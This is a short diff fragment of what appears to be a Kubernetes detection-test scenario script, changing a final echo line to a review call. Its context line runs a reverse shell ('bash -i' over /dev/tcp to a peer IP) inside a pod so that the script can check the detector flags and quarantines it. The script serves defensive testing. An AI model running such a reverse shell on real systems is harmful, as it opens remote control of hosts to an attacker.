@@ -31,4 +31,4 @@ kubectl exec -n "$SCENARIO_NS" "$POD" -- bash -c "bash -i >/dev/tcp/${PEER_IP}/4
 
 scenario_expect_case "$POD" "$RULE"
 scenario_expect_quarantine "$POD"
-echo "Review it: make cases"
+scenario_review "$POD"
